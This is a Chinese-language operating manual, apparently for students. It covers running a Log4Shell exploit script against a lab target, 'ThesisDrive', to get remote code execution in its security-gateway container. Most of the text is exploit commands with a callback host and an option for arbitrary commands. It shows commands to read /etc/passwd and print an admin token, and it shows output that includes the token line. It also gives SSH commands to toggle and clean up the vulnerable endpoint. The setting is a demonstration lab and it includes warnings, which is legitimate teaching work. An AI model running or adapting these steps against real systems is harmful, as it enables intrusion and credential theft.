# Log4Shell 演示 · 同学操作手册

> 目标：在一台**只装了 Python 3** 的机器上，把 ThesisDrive 靶场的
> Log4Shell 漏洞完整打通，并在本地终端直接看到容器内 `id` 的执行结果。
>
> 不需要 JDK，不需要 Docker，不需要装任何 Python 第三方库。

---

## 0. 先确认三件事

| 检查项 | 命令（PowerShell） | 期望 |
| --- | --- | --- |
| Python 可用 | `python --version` | `Python 3.x` |
| 能连靶场 | `curl https://<LAB-IP>:8008 -k` | 有 HTTP 响应（不是超时） |
| SSH 能通靶机 | `ssh opencloud "echo ok"` | 打印 `ok` |

第三条最关键 —— **本方案需要 SSH 到靶机**，因为 `id` 的结果写在靶机的
容器里，必须"进去取回来"。SSH 凭据由靶场提供方配置（`~/.ssh/config`）。

---

## 1. 放好两个文件

```
<任意目录>\
  ├── log4shell_exp.py          ← 脚本（单文件，无依赖）
  └── （SSH 凭据由提供方预先配置）
```


---

## 2. 一条命令跑完全链（推荐）

```powershell
cd <你放脚本的目录>
$env:PYTHONIOENCODING="utf-8"
python log4shell_exp.py --external --ssh opencloud --host <LAB-IP> --port 8008 --callback 172.20.0.1 --insecure
```

跑完你会看到（关键部分）：

```
  ┌── 网关容器内任意命令回显 /tmp/RCE_PROOF_LOG4SHELL_id.txt ─────
  │ ===== id =====
  │ uid=10001(carapace) gid=10001(carapace) groups=10001(carapace)
  │ ===== whoami / uname =====
  │ carapace
  │ Linux 550d477ccfee 6.6.117-45.1.oc9.x86_64 ... GNU/Linux
  │ ===== hostname / pwd =====
  │ 550d477ccfee
  │ /app
  │ ===== ls /app =====
  │ -rw-r--r-- 1 carapace carapace 34663488 carapace.jar
  │ ===== 敏感环境变量 =====
  │ CARAPACE_ADMIN_TOKEN=<ADMIN-TOKEN>
  │ ===== 写文件权限验证 =====
  │ LOG4SHELL-WRITE-TEST
  └──────────────────────────────────────────
```

**这就是 RCE 的证据** —— 那串 `id` 是在靶机的 `security-gateway`
容器里执行的，不是在你机器上。

---

## 2.1 执行指定的命令（`--cmd`）

同学想看什么命令的回显，用 `--cmd` 直接指定：

```powershell
# 看 /etc/passwd
python log4shell_exp.py --external --ssh opencloud --host <LAB-IP> --port 8008 --callback 172.20.0.1 --insecure --cmd "cat /etc/passwd"

# 看管理令牌
python log4shell_exp.py --external --ssh opencloud --host <LAB-IP> --port 8008 --callback 172.20.0.1 --insecure --cmd "echo $CARAPACE_ADMIN_TOKEN"

# 多条命令用分号串起来
python log4shell_exp.py --external --ssh opencloud --host <LAB-IP> --port 8008 --callback 172.20.0.1 --insecure --cmd "id; hostname; ls -la /app"
```

回显会原样打在本地终端。不加 `--cmd` 时执行内置命令集
（`id` / `whoami` / `uname` / `env` / `ls /app` / 进程 / 写文件验证）。

> PowerShell 里 `$` 会被本地展开，要传给容器就转义：`\$CARAPACE_ADMIN_TOKEN`。
> 或者用单引号包住整条命令。

## 3. 分工模式（可选）

如果要两个人配合演示 —— 一人负责发攻击，另一人（有 SSH）负责把结果
投屏给大家看：

**发攻击的人：**

```powershell
python log4shell_exp.py --external --stay --ssh opencloud --callback 172.20.0.1 --insecure
```

（`--stay` = 跑完保留靶机上的回调服务，方便反复演示）

**看结果的人：**

```powershell
python log4shell_exp.py --read --ssh opencloud
```

`--read` 不发任何攻击，只把上一次 RCE 留下的回显拉下来打印。

---

## 4. 三个命令分别是什么

| 命令 | 作用 | 需要 SSH | 会发攻击 |
| --- | --- | --- | --- |
| `--external` | 全链一条龙：编译 → 部署回调 → 发攻击 → 取回显 → 清理 | 是 | 是 |
| `--external --cmd "..."` | 同上，但执行你指定的命令 | 是 | 是 |
| `--external --stay` | 同上，但**不清理**靶机回调服务 | 是 | 是 |
| `--read` | 只读上次的回显 | 是 | **否** |

一次完整运行约 **20 秒**（含靶机编译）。提速手段：回调服务就绪用
0.25 秒轮询、回连不等固定秒数而是轮询日志（看到 `.class` 被下载即继续）。

## 5. 常见问题

**Q: `[!] 本机编译不可用: 找不到 javac` 是错了吗？**

不是。你的机器没有 JDK 是**预期情况**，脚本会自动改为在靶机上编译。
看到这个提示后正常往下走就行。

**Q: 为什么 `id` 结果不在我本机？**

因为 `id` 是在**靶机的容器里**执行的，输出文件在容器内的 `/tmp`。
脚本的最后一步会通过 SSH 把它读回来打印 —— 所以你看到的输出是
"取回来的"，不是在本地执行产生的。

**Q: 报错 `未找到 RCE 证据文件`？**

说明这次没有打成功，常见原因：

- 靶场开关没开（`LOG4SHELL_TRUST_CODEBASE=false`）
  → 找提供方执行 `scripts/log4shell_switch.sh on --recreate`
- 靶机容器被重建过（重建会清空容器内 `/tmp`）
- 回调服务端口 1389/8888 被占

**Q: 能换一个命令执行吗？（比如 `cat /etc/passwd`）**

能，但要改脚本：改 `EXPLOIT_SOURCE` 里那个 shell 串，然后重跑一次。
或者演示时临时验证用这条：

```powershell
ssh opencloud "docker exec thesis-drive-security-gateway-1 cat /etc/passwd"
```

（注意：这条是**管理员操作**，不是漏洞利用 —— 它走的是你的 SSH 权限。）

## 6. 演示结束后

```powershell
# 清理靶机上的回调服务和证据文件
ssh opencloud "docker exec thesis-drive-security-gateway-1 rm -f /tmp/RCE_PROOF_LOG4SHELL*; rm -rf /tmp/log4shell_helper /tmp/log4shell_payload"

# 关闭漏洞开关（重要！否则公网匿名可 RCE）
ssh opencloud "/root/Yulin2026/thesis/scripts/log4shell_switch.sh off --recreate"
```

---

## 7. 注意事项

- **SSH 凭据等同靶机 root 权限**：能操作靶机上的一切。仅限授权人员持有。
- **别把靶机地址、SSH 凭据外传**；本脚本亦勿公开分发。
- 开关开启期间，`<LAB-IP>:8008/api/log4shell` 是**公网匿名可达的
  真实 RCE 端点**，演示完请务必关闭。
